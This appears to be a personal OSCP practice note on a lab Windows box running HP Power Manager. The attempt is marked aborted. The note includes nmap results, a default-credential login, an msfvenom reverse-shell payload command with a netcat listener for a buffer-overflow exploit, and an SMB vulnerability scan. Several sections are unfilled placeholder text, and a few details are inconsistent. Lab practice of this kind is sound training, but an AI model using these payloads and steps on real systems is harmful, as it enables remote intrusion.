---
Date: 2024-10-24
Course: "[[OSCP]]"
Platform: PG-Practice
Category: Windows
Difficulty: Easy
Status: Aborted
IP: 192.168.242.45
Writeup: https://dylanrholloway.com/proving-grounds-kevin-write-up/
---
# Kevin
I've checked all the walkthroughs, tried countless variations of the easily available exploits, even reimaged my entire Kali VM trying to make this script work... and nothing I've done has caught a reverse shell. 

Honestly not sure what else to do, other than to write this off as a learning experience (?) and move on. If I get a buffer overflow exploit in the exam (which I think they've stopped now anyway) I'll just move the fuck on because nothing I've done on this box or the last one has really made any sense.

# Resolution summary
- Unresolved
## Improved skills

## Used tools
- nmap
- python

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN Kevin.nmap 192.168.242.45 -v
```

Enumerated open TCP ports:
```bash
PORT      STATE SERVICE            VERSION
80/tcp    open  http               GoAhead WebServer
| http-title: HP Power Manager
|_Requested resource was http://192.168.242.45/index.asp
|_http-server-header: GoAhead-Webs
| http-methods: 
|_  Supported Methods: GET HEAD
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=kevin
| Issuer: commonName=kevin
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-08-02T05:20:45
| Not valid after:  2025-02-01T05:20:45
| MD5:   53ab:b36b:cb2c:55e8:71a4:afb5:007e:393e
|_SHA-1: 828f:9bfb:e0ea:33ca:c77a:87bd:2f6b:c5f2:fc93:8411
| rdp-ntlm-info: 
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2024-10-24T10:13:53+00:00
|_ssl-date: 2024-10-24T10:14:01+00:00; +2s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h24m02s, deviation: 3h07m49s, median: 2s
| smb2-time: 
|   date: 2024-10-24T10:13:53
|_  start_date: 2024-10-24T10:09:15
| smb-os-discovery: 
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-10-24T03:13:52-07:00
| nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:eb:37 (VMware)
| Names:
|   KEVIN<00>            Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   KEVIN<20>            Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
```
---
# Enumeration
## Port 22 - SSH (OpenSSH 7.9p1)
No enumeration conducted
## Port 80 - HTTP (Apache)
- Navigated to `http://192.168.242.45:80` and identified `HP Power Manager`
![[Cybersecurity-Resources/images/Pasted image 20241024204921.png]]
- Password guessed credentials `admin:admin`
![[Cybersecurity-Resources/images/Pasted image 20241024205102.png]]
- Clicked "Logs" tab, navigated to `http://192.168.242.45/Contents/index.asp` and identified application logs
![[Cybersecurity-Resources/images/Pasted image 20241024213408.png]]
- Ran `searchsploit "HP Power Manager"` and identified potential exploit `10099.py`
![[Cybersecurity-Resources/images/Pasted image 20241024221345.png]]
- Reviewed `10099.py` code, then ran `msfvenom -p windows/shell_reverse_tcp -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.45.199 LPORT=80 -e x86/alpha_mixed -f c` to generate reverse shell for buffer overflow
![[Cybersecurity-Resources/images/Pasted image 20241025163857.png]]
- Copied buffer overflow into `10099.py` below "n00bn00b" line to replace existing code
![[Cybersecurity-Resources/images/Pasted image 20241025164015.png]]
- Saved `10099.py`, ran `nc -nvlp 80` to start netcat listener on port `80`, then ran exploit `python2 10099.py 192.168.171.45`
![[Cybersecurity-Resources/images/Pasted image 20241025164155.png]]
- No reverse shell received
![[Cybersecurity-Resources/images/Pasted image 20241025164223.png]]
## Port 135 - MSRPC (Windows RPC)

## Port 139 & 445 - SMB (Apache)
- Ran `sudo nmap --script smb-vuln* -p 139,445 192.168.242.45` and identified SMBv1 vulnerability (CVE-2017-0143)
![[Cybersecurity-Resources/images/Pasted image 20241024220205.png]]
## Port 3389 - RDP

## Port 49152-60 - MSRPC (Windows RPC)
---
# Exploitation
## Name of the technique
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

---
# Lateral Movement to user
## Local Enumeration
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

## Lateral Movement vector
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

---
# Privilege Escalation
## Local Enumeration
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

## Privilege Escalation vector
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

---
# Trophy & Loot
`local.txt` = ``
`proof.txt` = ``